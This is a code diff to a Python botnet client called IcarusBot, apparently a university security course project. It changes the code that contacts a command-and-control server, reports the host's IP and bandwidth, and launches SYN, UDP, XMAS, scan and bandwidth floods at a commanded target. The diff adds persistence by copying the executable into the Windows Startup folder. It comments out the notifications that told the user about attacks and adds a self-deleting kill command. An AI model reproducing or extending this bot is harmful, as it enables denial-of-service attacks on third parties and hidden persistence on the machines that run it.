@@ -10,7 +10,7 @@ import scan_flood
 import shutil
 import signal
 import socket
-import speedtest
+import speedtest  # This is contained within the working directory
 import syn_flood
 import sys
 import threading
@@ -18,10 +18,13 @@ import multiprocessing as mp
 import time
 import udp_flood
 import xmas_attack
+# import win10toast
+from os import remove
+from sys import argv
 from config import API_URL
 from enum import Enum
 from socket import timeout
-from win10toast import ToastNotifier
+# from win10toast import ToastNotifier
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 NUM_PACKETS_TO_SEND = 1000000000
@@ -54,12 +57,10 @@ class IcarusBot:
                     5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
                         5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
-        file = open("bot_name.txt", "r")
         global BOT_ID_NAME
         global NUM_PACKETS_TO_SEND
-        BOT_ID_NAME = file.read()
+        BOT_ID_NAME = sys.argv[0].split("\\")[-1].split(".")[0]
         print(BOT_ID_NAME, "IS RUNNING")
-
         print("GAUGING SPEED")
         st = speedtest.Speedtest()
         st.get_servers()
@@ -71,22 +72,17 @@ class IcarusBot:
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
-
         self.status = 'STARTED'
         self.attack_type = 'NONE'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
-
         self.exceptionsThrown = 0  # Tracks errors thrown during operation.
-
         # This is to deal with the active subprocess
-        self.mp = []
-
+        self.mp = None
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
         # Now we go and look for the C2 server.
-
-        notification(self.status)
+        add_to_startup()
         while True:
             print("contacting nameserver")
             nameserver_available = False
@@ -100,7 +96,6 @@ class IcarusBot:
                     time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
             print("nameserver found")
-            notification("CONNECTED")
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
@@ -134,10 +129,10 @@ class IcarusBot:
             2. If it times out (30 seconds)
                 2.1 disconnect with the webserver and ignore it.
                 2.2 Go back to asking the nameserver for a IP address for a C2 server.
+                2.3 If an error occurs (any at all), disconnect and re-connect to the nameserver.
         """
         self.status = 'IDLE'
-
-        # Now we notify the bot of our existence
+        # Now we notify the C&C server of our existence
         init_message = {
             'ip': self.ip,
             'status': self.status,
@@ -178,10 +173,6 @@ class IcarusBot:
                     }
                     response = json.dumps(response)
                 elif request_type == 'attack':
-                    # TODO: Implement attacks here
-                    # TODO: Number of packets to send?
-                    # Angus: We just keep running until a stop attack is issued.
-                    # TODO: Specify port(s) to attack
                     try:
                         portList = ports[1:len(ports) - 1].split(",")
                         for n in range(0, len(portList)):
@@ -193,18 +184,13 @@ class IcarusBot:
                             self.target_ip = target_ip
 
                         if attack_type == 'SYN_FLOOD':
-                            # attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
-                            # attack_thread.start()
-                            # attack_thread.join() <-- Angus: DO NOT USE THIS. IT WILL BLOCK THE MAIN THREAD UNTIL IT STOPS. WE WANT IT TO RUN ASYNCHRONOUSLY.
-                            #                                   even use multiprocessing like the following code example:
-                            #                                   import multiprocessing
-                            #                                   proc = multiprocessing.Process(target=your_proc_function, args=())
-                            #                                   proc.start()
-                            #                                   # Terminate the process
-                            #                                   proc.terminate()  # sends a SIGTERM
-
                             # The following code is hilariously long and redundant, but who cares?
-                            for n in range(0, 15):
+                            if self.mp is None:
+                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
@@ -239,7 +225,12 @@ class IcarusBot:
                                                      args=(target_ip, NUM_PACKETS_TO_SEND))
                                 self.mp.start()
                         elif attack_type == 'SCAN_FLOOD':
-                            for n in range(0, 15):
+                            if self.mp is None:
+                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
                                 self.mp = mp.Process(target=scan_flood.SCAN_Flood,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND))
                                 self.mp.start()
@@ -253,7 +244,6 @@ class IcarusBot:
                                 self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
                                                      args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
                                 self.mp.start()
-
                         print("EXECUTING ATTACK:", attack_type)
                         response = {
                             'ip': self.ip,
@@ -266,6 +256,7 @@ class IcarusBot:
                             'exceptionsThrown': self.exceptionsThrown
                         }
                         response = json.dumps(response)
+
                     except Exception as ex:
                         self.exceptionsThrown += 1
                         print("ERROR EXECUTING ATTACK", ex)
@@ -280,8 +271,43 @@ class IcarusBot:
                             'exceptionsThrown': self.exceptionsThrown
                         }
                         response = json.dumps(response)
+                elif request_type == 'stop':
+                    if self.mp is not None:
+                        self.mp.terminate()
+                    # notification("STOPPED")
+                    self.status = "IDLE"
+                    self.attack_type = "none"
+                    self.target_ip = "none"
+                    response = {
+                        'ip': self.ip,
+                        'status': self.status,
+                        'id': self.bot_id,
+                        'runtime': self.attack_runtime,
+                        'bandwidth': self.uploadBandwidth,
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
+                    }
+                    response = json.dumps(response)
 
                 # This will then send the message back to the server, irrespective of the flag.
+                elif request_type == 'kill':
+                    self.status = "DEAD"
+                    # notification("DEAD")
+                    response = {
+                        'ip': self.ip,
+                        'status': self.status,
+                        'id': self.bot_id,
+                        'runtime': self.attack_runtime,
+                        'bandwidth': self.uploadBandwidth,
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
+                    }
+                    response = json.dumps(response)
+                    self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
+                    remove(argv[0])
+                    sys.exit(0)
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
             except timeout:
@@ -316,7 +342,7 @@ class IcarusBot:
 
 def notification(action):
     """opens windows notification"""
-    toast = ToastNotifier()
+    # toast = ToastNotifier()
     title = ""
     body = ""
     if action == "STARTED":
@@ -327,10 +353,13 @@ def notification(action):
         body = "NOTHING TO WORRY ABOUT"
     elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
-        body = "I AM ATTACKING. PLEASE IGNORE."
+        body = "I AM ATTACKING."
     elif action == "STOPPED":
-        title = "ICARUS IS DONE ATTACKING"
-        body = "I AM DONE ATTACKING. PLEASE IGNORE."
+        title = "ICARUS HAS STOPPED"
+        body = "I HAVE STOPPED ATTACKING."
+    elif action == "DEAD":
+        title = "ICARUS IS DELETING ITSELF"
+        body = "THANK YOU FOR RUNNING THIS. I AM NOW DELETING MYSELF"
     else:
         title = "ICARUS BOT CALLED OFF"
         body = "The bot finished its job"
@@ -345,17 +374,20 @@ def notification(action):
 
 
 def add_to_startup(file_path=""):
+    # This will add it to the startup folder.
     if file_path == "":
         file_path = os.path.realpath(sys.argv[0])
-    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\coms4507-bot.exe"
+    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{BOT_ID_NAME}.exe"
     # only copy across if startup directory exists and file doesn't
     if os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path):
         shutil.copy(file_path, exe_path)
 
-
+#
 def main():
+
     IcarusBot()
 
 
 if __name__ == "__main__":
+    mp.freeze_support()
     main()
